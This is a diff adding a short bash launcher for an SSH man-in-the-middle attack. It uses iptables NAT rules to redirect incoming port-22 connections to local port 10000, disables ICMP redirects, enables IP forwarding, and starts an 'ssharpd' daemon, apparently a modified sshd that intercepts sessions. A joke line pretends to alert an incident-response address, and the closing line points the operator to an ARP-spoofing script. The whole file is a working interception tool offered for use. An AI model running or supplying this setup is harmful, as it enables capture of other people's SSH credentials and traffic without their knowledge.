@@ -1,0 +1,46 @@
+#!/bin/bash
+
+# set this path to a ssharpd binary
+SSHARPD=./ssharp/__sshd
+
+echo -n "Setting up ssh traffic redirection... "
+iptables -t nat -A PREROUTING -p tcp --dport 22 --sport 1000:8000 -j REDIRECT --to-ports 10000 2> /dev/null
+if [ "$?" != "0" ]; then
+  echo "Error!"
+  exit 1
+fi
+
+iptables -t nat -A PREROUTING -p tcp --dport 22 --sport 20000:60000 -j REDIRECT --to-ports 10000
+if [ "$?" != "0" ]; then
+  echo "Error!"
+  exit 1
+fi
+
+echo "done."
+
+echo -n "Configuring interfaces... "
+for x in `ls /proc/sys/net/ipv4/conf`; do
+  echo 0 > /proc/sys/net/ipv4/conf/$x/send_redirects
+done
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "done."
+
+
+echo > /tmp/____asd
+echo -n "Starting daemon... "
+$SSHARPD -4 -p 10000 < /tmp/____asd 2> /dev/null
+
+if [ "$?" != "0" ]; then
+  echo "Error!"
+  rm -rf /tmp/____asd
+  exit 1
+fi
+rm -rf /tmp/____asd
+echo "done."
+
+echo "Dropping vicki@incidents.org a hint about suspicious traffic... "
+echo "Error!"
+
+echo "Now run arp.sh (uhh.. did you already write it?)"
+ 
